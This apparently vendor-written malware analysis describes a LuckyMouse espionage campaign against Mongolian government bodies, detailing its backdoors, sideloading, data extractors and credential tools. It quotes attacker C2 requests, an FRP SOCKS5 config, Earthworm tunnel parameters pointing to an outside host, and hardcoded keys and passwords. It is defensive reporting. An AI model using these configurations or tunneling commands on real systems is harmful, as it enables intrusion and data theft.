62em){.__m__-_R_2muqssm_{--col-flex-grow:auto;--col-flex-basis:58.333333333333336%;--col-max-width:58.333333333333336%;}}</style><div class="m_96bdd299 mantine-Grid-col __m__-_R_2muqssm_"><article class="blog-article-body"><address class="article-author visually-hidden">By <span><a rel="author" href="/blog/authors/threat-research-team">Threat Research Team</a></span></address><div style="--container-size:var(--container-size-xxl);max-width:calc(97.5rem * var(--mantine-scale));padding-inline:0rem" class="m_7485cace mantine-Container-root" data-size="xxl" data-strategy="block" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p><strong>Introduction&nbsp;</strong></p><p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p><p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p><p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p><p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p><p><strong>Attribution &amp; Clusterization</strong></p><p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<em>IntgStat.exe</em>). This is a legitimate application that loads a DLL <em>pcalocalresloader.dll</em>. By sideloading their own version <em>pcalocalresloader.dll</em>, they load HyperBro RAT from a compressed and encrypted file<em> thumbs.db</em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>].</p><p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em>thinprobe.exe</em> that loads <em>thinhostprobedll.dll</em>. This DLL was then used to sideload <em>thumb.db</em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p><p><strong>Infection Chain</strong></p><p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p><p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p><p>XXXXXX_update.exe&nbsp;</p><p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p><p>This archive drops three already familiar files – Symantec’s <em>thinprobe.exe</em>, malicious <em>thinhostprobedll.dll</em>, and <em>thumb.db</em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em>thumb.db</em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fgraph_dark.png.webp%3Fitok%3DxZKkQ35x&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 1: Overview of infection vector</p></div><div class="RichText_wrapper__xZRh7"><p><strong>Toolset</strong></p><p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p><ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul><p>In detail, we found the following tools:</p><h2><strong>StartServiceTool</strong></h2><p>This tool installs <em>wcm.dll</em> into <em>%WINDIR%\system32</em>, a registry record</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</p><p>is created with the following values:</p><p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p><p>DisplayName: Windows Connections Manager</p><p>ServiceDll: C:\Windows\system32\wcm.dll.</p><p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p><p>The final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.</p><p>Initially, it tries do download a file from Dropbox via the HTTP API:</p><p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p><p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p><p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p><p>%currentDate% %currentTime%##%hostname%</p><p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" class="RichText_wrapper__xZRh7"><p>At first, security descriptors of both <em>%windir%\system32\ </em>and <em>%windir%\system32\drivers\ </em>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <em>%windir%\system32\</em> under a randomly generated name (4 alphanumeric characters).</p><p>Depending on whether a service named <em>DFS Replication</em> already exists in&nbsp;</p><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs,</p><p>a new service called <em>DFS Replication </em>(if it does not exist) or <em>IAS Jet Database Access Service %number%</em> is created. More specifically, its parameters are:</p><p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”</em><br>DisplayName: DFS Replication/IAS Jet Database Access Service %number%<br>ServiceDll: C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll.<br>Tag: 0<br>Security: 0</p><h2><strong>ShellCodeExecutor</strong></h2><p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro memory</p></div><div class="RichText_wrapper__xZRh7"><p>While we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex-encoded metasploit-generated shellcode (reverse HTTP proxy – <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm">Github</a> configured to connect to URL <em>oss.chrome-upgrade[.]com</em> (202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&amp;C server.</p><h2><strong>DataExtractor 1</strong></h2><p>This tool can be used to gather potentially sensitive documents with <em>pdf</em>,<em> ppt</em>,<em> xls</em>, and <em>doc</em> file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“zaq1xsw@cde3</em>”. This archive will be then saved to <em>C:\MSBuild\NVIDIA\ </em>under a filename <em>CRYPTO-%computerName%-%number_value%.SYS</em>. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p><p>After each run, a file <em>%windir%\system32\igfxme.vbs </em>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p><h2><strong>DataExtractor 2</strong></h2><p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p><p>Below you will see a part of an error message, providing us the information about how this utility is used:</p><p><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></p><p>More generally, the command’s format is:</p><p><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></p><h2><strong>Information Collector</strong></h2><p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p><p><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</p><p><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</p></div><div class="RichText_wrapper__xZRh7"><p><em>It ensures its persistence by adding itself into Run (SOFTWARE\Microsoft\Windows\CurrentVersion\Run) registry key under AvpSecurity.</em></p><p>Interestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also supports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p><p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p><h2><strong>RAT</strong></h2><h3><strong>Korplug (PlugX)</strong></h3><p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p><p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em>http_dll.dll</em>. This DLL, in turn, decrypts <em>http_dll.dat</em> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p><p>Address of C&amp;C servers:&nbsp;</p><p>web[.]microlynconline[.]com:80<br>home[.]microlynconline[.]com:8000<br>help[.]microlynconline[.]com:443<br>host[.]microlynconline[.]com:53</p><h2><strong>Backdoors</strong></h2><p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p><h3><strong>LuckyBack</strong></h3><p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (45.77.55[.]145). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p><h4><strong>Technical:</strong></h4><p>At first, the used code page is retrieved by calling <em>chcp</em>, a command providing the keyboard and character set information, on the system drive.</p><p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p><p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=qkIFjWso 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=2sElrukP 2x" media="(min-width: 720px)"/><source media="(min-width: 420px)"/><img alt="" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" style="color:transparent;width:100%;height:100%" srcSet="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=384&amp;q=75 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><h3><strong>BlueTraveller</strong></h3><p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p><p>The binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&amp;U*A|}t~k”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/blank">http://go.vegispaceshop[.]org/shop.htm</a>. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" 6: Script which decrypts the white spaces from the html response" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-4_0.png.webp%3Fitok%3DqcYJdIDI&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 6: Script which decrypts the white spaces from the html response</p></div><div class="RichText_wrapper__xZRh7"><p>The BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string “<em>0304276cf4f31345“</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p><p><em>http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</em></p><p>After this request is executed, commands are retrieved from:</p><p><em>http://&lt;second_layer_C&amp;C&gt;/index.htm.</em></p><p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p><p>http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</p><h3><strong>Polpo</strong></h3><p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" class="RichText_wrapper__xZRh7"><p>Base64-encoded addresses of C&amp;C servers are hard-coded in the binary</p><h4><strong>Polpo – Communication</strong></h4><p>The backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64 then sent as a part of fake HTML content.&nbsp;</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" a proxy is configured it uses the server specified in <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer </em>for all the connections.&nbsp;</p><h4><strong>Polpo – Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro commands are supported by the version of Polpo we’ve analyzed:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro media="(min-width: 420px)"/><img alt="" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" style="color:transparent;width:100%;height:100%" srcSet="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.19.56%25E2%2580%25AFAM.png.webp%3Fitok%3Dq3FiikHL&amp;w=384&amp;q=75 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.19.56%25E2%2580%25AFAM.png.webp%3Fitok%3Dq3FiikHL&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.19.56%25E2%2580%25AFAM.png.webp%3Fitok%3Dq3FiikHL&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source 1x, 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FFRP_graph.png.webp%3Fitok%3DpdFuuMia&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 10: Diagram of FRP tool usage</p></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li>&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li> List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network 